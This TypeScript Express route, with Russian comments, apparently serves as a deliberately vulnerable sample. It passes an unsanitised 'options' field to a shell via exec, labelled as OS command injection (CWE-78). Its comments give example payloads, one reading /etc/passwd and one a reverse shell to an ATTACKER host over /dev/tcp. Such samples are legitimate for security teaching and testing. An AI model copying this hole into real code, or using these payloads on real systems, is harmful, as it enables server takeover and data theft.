import { Router, Request, Response } from 'express';
import { exec } from 'child_process';

const router = Router();

/**
 * POST /api/admin/debug/system-status
 *
 * Эндпоинт для "системного мониторинга".
 * Намеренно содержит уязвимость OS Command Injection (CWE-78).
 * Параметр `options` не санируется перед передачей в shell.
 */
router.post('/system-status', (req: Request, res: Response): void => {
  const { tool, options } = req.body;

  // Белый список "разрешённых" инструментов — выглядит безопасно
  const allowedTools = ['df', 'free', 'uptime', 'top'];

  if (!tool || !allowedTools.includes(tool)) {
    res.status(400).json({ error: 'Invalid tool. Allowed: df, free, uptime, top' });
    return;
  }

  // УЯЗВИМОСТЬ: options не экранируется, shell интерпретирует метасимволы
  // Пример эксплуатации: options = "; cat /etc/passwd"
  // Или: options = "; bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'"
  const fullCommand = `${tool} ${options || ''}`;

  console.log(`[DEBUG] Executing: ${fullCommand}`);

  exec(fullCommand, { timeout: 10000 }, (error, stdout, stderr) => {
    if (error) {
      res.status(500).json({ error: error.message, stderr });
      return;
    }
    res.json({ output: stdout, command: fullCommand });
  });
});

export default router;
